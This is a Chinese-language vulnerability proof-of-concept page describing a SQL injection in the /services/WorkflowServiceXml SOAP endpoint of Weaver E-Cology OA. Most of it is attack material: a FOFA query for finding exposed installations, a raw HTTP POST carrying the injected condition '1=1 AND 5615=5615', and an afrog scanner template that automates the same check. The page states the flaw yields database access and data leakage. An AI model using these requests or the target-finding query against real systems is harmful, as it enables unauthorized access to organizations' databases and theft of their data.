# 泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞

泛微OA E Cology 接口/services/WorkflowServiceXml 存在SQL注入漏洞，可获取数据库权限，导致数据泄露。

## fofa

```yaml
app="泛微-OA（e-cology）"
```

## poc

```yaml
POST /services/WorkflowServiceXml HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: text/xml
Accept-Encoding: gzip
Content-Length: 487

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
  <soapenv:Body>
      <web:getHendledWorkflowRequestList>
        <web:in0>1</web:in0>
        <web:in1>1</web:in1>
        <web:in2>1</web:in2>
        <web:in3>1</web:in3>
        <web:in4>
            <web:string>1=1 AND 5615=5615</web:string>
        </web:in4>
      </web:getHendledWorkflowRequestList>
  </soapenv:Body>
</soapenv:Envelope>
```

![image-20240713144906637](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407131449840.png)

![image-20240713144940509](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407131449561.png)



## afrog poc

```yaml
id: 泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞

info:
  name: 泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞
  author: wy876
  severity: high
  verified: true
  description: |-
    泛微OA E Cology 接口/services/WorkflowServiceXml 存在SQL注入漏洞，可获取数据库权限，导致数据泄露。
    Fofa: app="泛微-OA（e-cology）"

  reference:
    - https://github.com/wy876/POC/blob/main/泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞.md
  tags: 泛微e-cology
  created: 2024/07/13


rules:
  r0:
    request:
      method: POST
      path: /services/WorkflowServiceXml
      headers:
        Content-Type: text/xml
      body: |
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
        <soapenv:Body>
        <web:getHendledWorkflowRequestList>
        <web:in0>1</web:in0>
        <web:in1>1</web:in1>
        <web:in2>1</web:in2>
        <web:in3>1</web:in3>
        <web:in4>
            <web:string>1=1 AND 5615=5615</web:string>
        </web:in4>
        </web:getHendledWorkflowRequestList>
        </soapenv:Body>
        </soapenv:Envelope>
    expression: response.status == 200 && response.body.bcontains(b'WorkflowRequestInfo') && response.body.bcontains(b'workflowName') && response.body.bcontains(b'lastOperatorName')

expression: r0()
```

